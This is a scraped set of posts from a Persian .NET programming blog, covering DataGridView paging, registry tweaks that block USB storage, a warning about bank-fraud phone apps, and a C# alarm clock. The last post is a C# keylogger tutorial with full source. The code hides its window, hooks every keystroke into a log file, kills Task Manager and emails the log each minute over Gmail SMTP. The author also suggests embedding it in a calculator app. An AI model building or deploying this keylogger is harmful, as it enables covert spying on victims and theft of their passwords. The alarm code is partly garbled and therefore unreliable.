{"type": "blog", "blog_name": ".NET Developer", "blog_url": "http://12120.blog.ir/", "post_url_1": "http://12120.blog.ir/post/61", "post_title_1": "صفحه بندی در دیتاگرید", "post_content_1": "\nسلامصفحه بندی در دیتاگردید ویو برای مرتب کردن دیتاگرید و ترتیب  جدول در بانکهای بزرگ مهمه من مدتی دنبال این سورس بودماما چه در سایتهای داخلی یا خارجی پروژه ای بدین صورت نبود منظورم با دیتابیس اکسس هست اگر هم با اس کیو ال نوشته شده هست دارای ایراده و برخی پروژه ها برای یه صفحه بندی ساده بالای 200 خط کد نویسی کرده بودندر این پروژه 4 وضعیت بعدی-قبلی-اولین و اخرین قرار داده شده حتی یه سایت رو دیدم که برنامه خارجی رو ویرایش کرده و در معرض فروش گذاشته بود که کار درستی نیستاین سورس رو قرار میدم امیوارم استفاده لازمو ازش ببریداین پروژه با دیتابیس اکسس نوشته شده ابتدا چند متغییر برای شمارش دیتا گرید -جمعبندی دیتاگرید-و یه کانکشن استرینگ ایجاد میکنیمیه تابع برای دریافت مقادیر از دیتاگردی ویو و یه تابع برای محاسبه وضعیت دیتاگرید میسازیمسورس صفحه بندی در دیتاگردید\n", "post_url_2": "http://12120.blog.ir/post/60", "post_title_2": "محافظت از سیستم های شخصی", "post_content_2": "\nبنام خداخیلی پیش اومده که از لپ تاپ یا سیستم های شخصی اطلاعات خانوادگی یا شخصی سرقت شدند حال برای جلوگیری از اینکار ها باید تنظیمات سیستم رو یکبار اما برای همیشه ست کنیدبهتره بدونید نرم افزارهایی که در سیستم شما نصب شدند یا نصب خواهید کرد حتما اصل باشند یعنی حین نصب نام ناشر یا مشخصاتشرکت منتشر کننده ر و مشاهده کنید--تصویر پایینهمیشه با power user کار کنید یعنی اختیارات ادمین رو برای کاربری خوتون اعمال نکنید چون تروجانها و ویروس هایی که با بیس سیستم کار دارند برای نصب نیاز به دسترسی ادمین دارندچندین راه برای مسدود کردن usb هستش به رمز ویندوز اعتماد نکنید اگر رمز شما 20 رقمی و ترکیبی هم باشه در عرض 5 دقیقه اونی کهمیخاد وارد سیستم خواهد شد بهترین راه گذاشتن پسورد در بایوس هست که اگه کامپیوتر pc باشه نهایت چند دقیقه کار سارق رو به تاخیر انداخت اگر لپ تاپ باشه نیم ساعتحال  تنظیمات رجستری رو اجرا کنید و این مسیر رو دنبال کنیدHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTORحال در داخل صفحه یه کلیدی با نام start مشاهده میکنید مقدار اونو به 4 تغییر بدید در این صورت پورت یو اس ی غیر فعال میشه البته باید سیسم ریبوت بشه و با دادن مقدار 3 به حالت پیشفرض باز میگرددبرای سهولت کار من فایل های رجیستری رو در پایین قرای دانلود قرار میدمروش دوم باز هم در رجیستری هست در این مسیر\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies\nکلیدی با عنوان WriteProtect ساخته و مقدارش رو برابر یک قرار بدید در این صورت حین انتقال فایل به فلش مموری خطای WriteProtect نمایش داده خواهد شد\n\n\n\nاین کد غیر فعال سازی پورت یو اس بی هستش\nWindows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR]\n\"ImagePath\"=hex(2):5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\\\n  74,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,64,00,72,\\\n  00,69,00,76,00,65,00,72,00,73,00,5c,00,55,00,53,00,42,00,53,00,54,00,4f,00,\\\n  52,00,2e,00,53,00,59,00,53,00,00,00\n\"Type\"=dword:00000001\n\"Start\"=dword:00000004\n\"ErrorControl\"=dword:00000001\n\"DisplayName\"=\"@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver\"\n\"Owners\"=hex(7):75,00,73,00,62,00,73,00,74,00,6f,00,72,00,2e,00,69,00,6e,00,66,\\\n  00,00,00,76,00,5f,00,6d,00,73,00,63,00,64,00,73,00,63,00,2e,00,69,00,6e,00,\\\n  66,00,00,00,00,00\n\"BootFlags\"=dword:00000014\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR\\Enum]\n\"Count\"=dword:00000001\n\"NextInstance\"=dword:00000001\n\"0\"=\"USB\\\\VID_090CPID_1000\\\\AASTK5F1DOHYEII4\"\n\n\n\nقفل کردن فلش درایو \nhttp://s8.picofile.com/file/8316525826/lockUSB.reg.html\n\nغیر فعال کردن پورت یو اس بی\nhttp://s8.picofile.com/file/8316525842/UnlockUSB.reg.html\n\nفعال کردن  و غیر فعال کردن به روش دوم\nhttp://s8.picofile.com/file/8316525876/usb_opent.reg.html\nhttp://s9.picofile.com/file/8316525892/usb_protect.reg.html\n\n", "post_url_3": "http://12120.blog.ir/post/59", "post_title_3": "هک شدن حسابهای بانکی و ایمیل", "post_content_3": "\nسلام این نوشته حاصل تحقیق در پروندهایی ست که هم اکنون در دادگاهها در جریان هستابان ماه سال جاری فردی با مراجعه به پلیس فتا اظهار داشت که مبلغ 11 میلیون تومان از حساب وی سرقت شده استبه دنبال وی به فاصله چند روز یک نفر هم از سرقت 1200000 تومان از حسابش خبر داد و پرونده ای در این خصوص تشکیل شددر بررسی ریز تراکنش حسابها مشخص شد مبلغ یک میلیون و دویست هزار تومان کلا بابت خرید شارژ 20 تومنی و 50 تومنی خرج شده اندان مبلغ 11 میلیون تومان نیز به حساب یک صراف در یکی از شهرستانها واریز شده استخوشبختانه قبل از تبدیل پول به بیت کوین پلیس فتا وارد عمل شده و 11 میلیون تومن را به صاحبش برگردانداما ان مبلغ یک میلیون و دویست هزار تومن به دلیل اینکه شارژ سیم کارت اعتباری خریداری شده انهم به مبالغ ریز نصف مبلغ بازر گردانده شدهدر بررسی گوشی های این اشخاص مشخص شد برنامه هایی نصب کردند که در هیچ مارکتی منتشر نشده است مثلا برنامه گیرنده ماهواره یا تناسب اندامو چند برنامه دیگه بود که از طریق تلگرام دانلود شده بودند در هر حال برای جلوگیریاز چنین کاری برنامه هایی که نیاز ندارند با اینترنت کار کنند از طریق تنظیمات دسترسی انها رو به اینترنت( -2 روش --اینترنت دیتا و وای فای--)قطع کنید اگر در حین خرید اینترنتی به صفحه ای هدایت شدید که ادرس ان فاقد ssl بود یعنی https --رمز خود رو در ان وارد نکنیداگر گوشی شما به خوبی و بدون هنگ کردن کار میکند اگر زمانی متوجه اختلال غیر معمول مانند هنگ کردن چند ثانیه ای بدون اینکه چندین برنامه باز باشه یا اصلا اگه هیچبرنامه ای باز نیست چنین چیزی اتفاق افتاد برنامه هایی که مشکوک هستید پاک کنیدو یا میتونید از طریق گوگل پلی و کافه بازار بررسی کنید که ایا این نرم افزار در مارکتی منتشر شده یا نهاول وارد حساب خود در گوگل پلی شوید سپس مانند تصویر با انتخاب گزینه نرم افزارهای موجود لیست اونا رو مشاهده خواهید کرد اگر درلیست گوگل یا بازار نبود حذفش کنید\n\n\n\n\n\nلیست برنامه ها\n", "post_url_4": "http://12120.blog.ir/post/58", "post_title_4": "ساخت یاداور -قرار ملاقات-آلارم در سی شارپ", "post_content_4": "سلام تو این پست میخام برنامه یاداور یا الارم رو بهتون اموزش بدماین برنامه میتونه به عنوان یاداور قرار ملاقات ها یا یاداوری زمان انجام کارها رو انجام بدهالبته در این مورد از دیتابیس استفاده نکردم برای استفاده طولانی مدت میبایست اطلاعات در دیتابیس ذخیره گردنداما میشه بدون دیتابیس هم کا رو راه انداخت مثلاتاریخ رو در رجیستری قرار میدیم و یه تایمربرای فرم اضافه میکنیمولی این مورد نیاز به دسترسی ادمین داره تا جایی که میتونم برای برنامه های ساده که کاربر پسند باشه این گزینه رو بکار نمیبرمابتدا یک فضای نام رو بهش اضافه میکنیم\nusing System.Globalization;\nاین برای تاریخ شمسی هستش\n\nحال متغییرها و متد تاریخ شمسی رو میسازیم\n PersianCalendar pc = new PersianCalendar();\n        DateTime Dtime = new DateTime();\n        string selectTime;\n        string selectsnooz;\n        string selectring;\n        string selectmsg;\n\n        bool alarmset = false;\n        bool snoozeset = false;\n\nفرم دیگری با نام رینگ فورم میسازیم که پیام رو حین الارم نشون بده\nبرای نشون دادن ساعت  و دقیقه از کمبو باکس استفاده کردم راههای زیادی هست ولی بهر حال من اینو انتخاب کردم\n for (int i = 0; i = 12; i++)\n            {\n                comboBox1.Items.Add(i.ToString());\n            }\n            for(int i=0; i =59;i++)\n            {\n                if (i10)\n                {\n                    comboBox2.Items.Add(0+i.ToString());\n                }\n                else\n                {\n                    comboBox2.Items.Add(i.ToString());\n                }\n comboBox3.Items.Add(\"AM\");\n            comboBox3.Items.Add(\"PM\");\n\n            comboBox4.Items.Add(\"1\");\n            comboBox4.Items.Add(\"5\");\n            comboBox4.Items.Add(\"10\");\n\nیه تایمر به پروژه اضافه میکنیم و کدهای زیر رو درونش قرار میدیدم این کدها مقایسه زمان قرار ملاقات با زمان جاری هستش تا زمانیکه هر دو برابر باشند کاری انجام نمیشه\n Dtime = DateTime.Now;\n            textBox2.Text = pc.GetYear(Dtime) + \"/\" + pc.GetMonth(Dtime) + \"/\" + pc.GetDayOfMonth(Dtime);\n            textBox3.Text = DateTime.Now.ToString(\"h:mm tt\");\n\n            if (alarmset)\n            {\n                if (textBox3.Text == selectTime  textBox1.Text == pc.GetYear(Dtime) + \"/\" + pc.GetMonth(Dtime) + \"/\" + pc.GetDayOfMonth(Dtime)) \n                {\n                    alarmset = false;\n                    System.Media.SystemSounds.Exclamation.Play();\n                  \n                    ringclass.ShowDialog();\n\n                }\nدانلود سورس آلارم سی شارپ\n\n\n\n\n\n", "post_url_5": "http://12120.blog.ir/post/57", "post_title_5": "ساخت کیلاگر در #C", "post_content_5": "سلام دوستانتو این پست میخام برنامه کاربردی رو بهتون اموزش بدم که همه کلید های زده شده کیبورد رو برامون بگیره و بعد بصورت ایمیل ارسال کنهالبته این پست جنبه اموزشی داره تا سطح علمی شما بالاتر بره سعی کنید در کارهای مخرب استفاده نکنید بهرحال کدهای مربوط به قرار گرفتن برنامه در استارت اپ رو ننوشتم --البته تو نت هستمن این برنامه رو توی محیط کنسول نوشتم یعنی میشد توی محیط فرم هم بنویسی مثلا این کدها رو تو حالت اکتیو یه برنامه ماشین حساب بذاری بعد از نصب دیگه همیشه اجرا بشهاینا برای اجرا نیاز به دسترسی ادمین داشتن اما این کدها در کنسول بدون نیاز به دسترسی ادمین اجرا میشندر این پروژه از کلاس یا فضای نام زیر استفاده کردم\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Net;\nusing System.Net.Mail;\nبقیه کلاس ها پیشفرض در پروژه قرار دارندر این  پروژه از توابع API نیز استفاده کردمابتدا متدهای  لازم رو میسازیم متغییر intptr تفاوتش با int در  کدها ی مدیت نشده است کدهای سی شارپ پیش فرض کدهای مدیریت شده هستند یعنی به زبان میانی IL ترجمه میشن نه زبان ماشین بخاطر همین نمیتونه بصورت مستقیم روی سیستم اجرا بشه پس به msil  ترجمه در چارچوب دات نت اجرا میشن به همین خاطر تمامی ویندوزها برای اجرای برنامه ها با ید دارای دات نت باشند البته برنامه های نوشته شده با سی و سی پلاس  از این قاعده مستثنی هستنداما کدهای مدیریت نشده مستقیا در حافظه سیستم لود  شده و اجرا میشن  مثل همین API -- و کدهای سی پلاسحال نوبت به نوشتن توابع API هستش \n[DllImport(\"kernel32.dll\")]\n        static extern IntPtr GetConsoleWindow();\n\n        [DllImport(\"user32.dll\")]\n        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\nحال نیاز دو متغییر ثابت برای مخفی شدن پنجره پس از اجرا  داریم\nconst int SW_HIDE = 0;\n        const int SW_SHOW = 5;\n\n\nطریقه ارسال ایمیل را در پست قبـــــلی شرح دادم اما با یک تفاوت در اینجا بجای متن پیام کلید های فشرده شده رو به ایمیل گیرنده میفرستیم\npublic static void smail(object source, EventArgs e)\n        {\n\n\n            Process[] ProcessList = Process.GetProcesses();\n            foreach (Process proc in ProcessList)\n            {\n                if (proc.MainWindowTitle.Contains(\"Taskmgr.exe\"))\n                {\n                    proc.Kill();\n                }\n            }\n                       MailMessage message = new MailMessage();\n           \n                      message.To.Add(\"recivermail@gmail.com\");\n                      \n            message.Subject = \"subject\";\n            string newfil = File.ReadAllText(@\"g:\\log.txt\");\n       \n            message.Body = newfil;\n                      \n            message.From = new MailAddress(\"sendermaim@gmail.com\", \"Dave on C-Sharp\");\n\n          \n            SmtpClient smtp = new SmtpClient(\"smtp.gmail.com\", 587);\n\n           \n            smtp.EnableSsl = true;\n\n          \n            smtp.UseDefaultCredentials = false;\n          \n            smtp.Credentials = new NetworkCredential(\"sendermaim@gmail.com\", \"پسورد ایمیل\");\n           \n            smtp.Send(message);\n\n        }\nحال نوبت به تبدیل کلید های فشرده شد و خیره انهاست\nprivate static IntPtr HookCallBack(int nCode,IntPtr wParam,IntPtr lParam)\n        {\n            //\n            //  Thread.Sleep(5);\n            if (nCode =0  wParam ==(IntPtr)WM_KEYDOWN)\n            {\n                int vCode = Marshal.ReadInt32(lParam);\n                if (((Keys)vCode).ToString()==\"OemPeriod\")//تبدیل کاراکتر های اسکی به اصلی\n                {\n                    Console.Out.Write(\".\");\n                    StreamWriter sW = new StreamWriter(@\"d:\\\\log.txt\", true);\n                    sW.Write(\".\");\n                    sW.Close();\n                    sW.Dispose();\n                }\n                //***********************************************\n                else if (((Keys)vCode).ToString() == \"Return\")//تبدیل کاراکتر های اسکی به اصلی\n                {\n                    Console.Out.Write(\"Enter\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"Enter\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n\n               \n                else if (((Keys)vCode).ToString() == \"Add\")//تبدیل کاراکتر های اسکی به اصلی\n                {\n                    Console.Out.Write(\"+\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"+\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n               \n                else if (((Keys)vCode).ToString() == \"OemQuestion\")\n                {\n                    Console.Out.Write(\"/\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"/\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Subtract\")\n                {\n                    Console.Out.Write(\"-\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"-\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Multiply\")\n                {\n                    Console.Out.Write(\"*\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"*\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Divide\")\n                {\n                    Console.Out.Write(\"/\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"/\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"LControlKey\")\n                {\n                    Console.Out.Write(\"CtrlA\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"CtrlA\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n\n                //***************************************************************\n                else if (((Keys)vCode).ToString() == \"Oemcomma\")\n                {\n                    Console.Out.Write(\",\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\",\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Space\")\n                {\n                    Console.Out.Write(\" \");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\" \");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else\n                {\n                   \n                    Console.Out.Write((Keys)vCode);\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write((Keys)vCode);\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n               \n            }\n            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);\n        }\n\nدر نهایت یک تابعی برای  API  را برای در دریافت کلید های فشرده شده و ذخیره شده و نگهداری انها  در سیستم مینویسیم\n private static IntPtr SetHook(LowLevelKeyboardProd proc)\n        {\n            Process currnt = Process.GetCurrentProcess();\n            ProcessModule currentModule = currnt.MainModule;\n            string moduleName = currentModule.ModuleName;\n            IntPtr modulehandle = GetModuleHandle(moduleName);\n            return SetWindowsHookEx(WH_KEYBOARD_DLL, llkProcedure, modulehandle, 0);\n\n        }\n        [DllImport(\"user32.dll\")]\n        private static extern IntPtr CallNextHookEx(IntPtr hhk,int nCode,IntPtr wParam,IntPtr lParam);\n        [DllImport(\"user32.dll\")]\n        private static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProd lpfn,IntPtr hMod,uint dwThreadID);\n\n        [DllImport(\"user32.dll\")]\n        private static extern bool UnHookWindowsHookExe(IntPtr hhk);\n\n        [DllImport(\"kernel32.dll\")]\n        private static extern IntPtr GetModuleHandle(String lpModuleName);\n\n\n\nحال توابع نوشته شده را به همراه یک تایمر در تابع اصلی قرار میدم\nstatic void Main(string[] args)\n        {\n\n           \n            var my = GetConsoleWindow();\n            ShowWindow(my,SW_HIDE);\n         \n\n            \n            hook = SetHook(llkProcedure);\n            System.Timers.Timer timer;\n            timer = new System.Timers.Timer();\n            timer.Elapsed += new ElapsedEventHandler(Program.smail);\n            timer.AutoReset = true;\n            timer.Interval = 60000;//هر یک دقیقه یکبار پیام میفرستد\n            timer.Start();\n            Application.Run();\n            GC.KeepAlive(timer);\n\n             UnHookWindowsHookExe(hook);\n\n\n        }\n\n\n\nusing System;\nusing System.Collections.Generic;\nusing System.Windows.Forms;\nusing System.Timers;\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\n\nusing System.IO;\nusing System.Net;\nusing System.Net.Mail;\n\nnamespace System_log\n{\n    class Program\n    {\n       \n        private static int WH_KEYBOARD_DLL = 13;\n        private static int WM_KEYDOWN = 0x0100;\n        private static IntPtr hook = IntPtr.Zero;\n        private static LowLevelKeyboardProd llkProcedure = HookCallBack;\n        [DllImport(\"kernel32.dll\")]\n        static extern IntPtr GetConsoleWindow();\n\n        [DllImport(\"user32.dll\")]\n        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n\n        const int SW_HIDE = 0;\n        const int SW_SHOW = 5;\n\n        static void Main(string[] args)\n        {\n\n           \n            var my = GetConsoleWindow();\n            ShowWindow(my,SW_HIDE);\n         \n\n            \n            hook = SetHook(llkProcedure);\n            System.Timers.Timer timer;\n            timer = new System.Timers.Timer();\n            timer.Elapsed += new ElapsedEventHandler(Program.smail);\n            timer.AutoReset = true;\n            timer.Interval = 60000;\n            timer.Start();\n            Application.Run();\n            GC.KeepAlive(timer);\n\n             UnHookWindowsHookExe(hook);\n\n\n        }\n     \n        public static void smail(object source, EventArgs e)\n        {\n\n\n            Process[] ProcessList = Process.GetProcesses();\n            foreach (Process proc in ProcessList)\n            {\n                if (proc.MainWindowTitle.Contains(\"Taskmgr.exe\"))\n                {\n                    proc.Kill();\n                }\n            }\n\n\n                       MailMessage message = new MailMessage();\n           \n                      message.To.Add(\"recivermail@gmail.com\");\n                      \n            message.Subject = \"subject\";\n            string newfil = File.ReadAllText(@\"g:\\log.txt\");\n       \n            message.Body = newfil;\n                      \n            message.From = new MailAddress(\"sendermaim@gmail.com\", \"Dave on C-Sharp\");\n\n          \n            SmtpClient smtp = new SmtpClient(\"smtp.gmail.com\", 587);\n\n           \n            smtp.EnableSsl = true;\n\n          \n            smtp.UseDefaultCredentials = false;\n          \n            smtp.Credentials = new NetworkCredential(\"sendermaim@gmail.com\", \"ddddd\");\n           \n            smtp.Send(message);\n\n        }\n        private delegate IntPtr LowLevelKeyboardProd(int nCode, IntPtr wParam, IntPtr lParam);\n\n        private static IntPtr HookCallBack(int nCode,IntPtr wParam,IntPtr lParam)\n        {\n            //\n            //  Thread.Sleep(5);\n            if (nCode =0  wParam ==(IntPtr)WM_KEYDOWN)\n            {\n                int vCode = Marshal.ReadInt32(lParam);\n                if (((Keys)vCode).ToString()==\"OemPeriod\")\n                {\n                    Console.Out.Write(\".\");\n                    StreamWriter sW = new StreamWriter(@\"d:\\\\log.txt\", true);\n                    sW.Write(\".\");\n                    sW.Close();\n                    sW.Dispose();\n                }\n                //***********************************************\n                else if (((Keys)vCode).ToString() == \"Return\")\n                {\n                    Console.Out.Write(\"Enter\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"Enter\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n\n               \n                else if (((Keys)vCode).ToString() == \"Add\")\n                {\n                    Console.Out.Write(\"+\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"+\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n               \n                else if (((Keys)vCode).ToString() == \"OemQuestion\")\n                {\n                    Console.Out.Write(\"/\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"/\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Subtract\")\n                {\n                    Console.Out.Write(\"-\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"-\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Multiply\")\n                {\n                    Console.Out.Write(\"*\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"*\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Divide\")\n                {\n                    Console.Out.Write(\"/\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"/\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"LControlKey\")\n                {\n                    Console.Out.Write(\"CtrlA\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\"CtrlA\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n\n                //***************************************************************\n                else if (((Keys)vCode).ToString() == \"Oemcomma\")\n                {\n                    Console.Out.Write(\",\");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\",\");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else if (((Keys)vCode).ToString() == \"Space\")\n                {\n                    Console.Out.Write(\" \");\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write(\" \");\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n                else\n                {\n                   \n                    Console.Out.Write((Keys)vCode);\n                    StreamWriter sW = new StreamWriter(@\"g:\\\\log.txt\", true);\n                    sW.Write((Keys)vCode);\n                    sW.Close();\n                    sW.Dispose();\n\n                }\n               \n            }\n            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);\n        }\n        private static IntPtr SetHook(LowLevelKeyboardProd proc)\n        {\n            Process currnt = Process.GetCurrentProcess();\n            ProcessModule currentModule = currnt.MainModule;\n            string moduleName = currentModule.ModuleName;\n            IntPtr modulehandle = GetModuleHandle(moduleName);\n            return SetWindowsHookEx(WH_KEYBOARD_DLL, llkProcedure, modulehandle, 0);\n\n        }\n        [DllImport(\"user32.dll\")]\n        private static extern IntPtr CallNextHookEx(IntPtr hhk,int nCode,IntPtr wParam,IntPtr lParam);\n        [DllImport(\"user32.dll\")]\n        private static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProd lpfn,IntPtr hMod,uint dwThreadID);\n\n        [DllImport(\"user32.dll\")]\n        private static extern bool UnHookWindowsHookExe(IntPtr hhk);\n\n        [DllImport(\"kernel32.dll\")]\n        private static extern IntPtr GetModuleHandle(String lpModuleName);\n\n    }\n}\n\n"}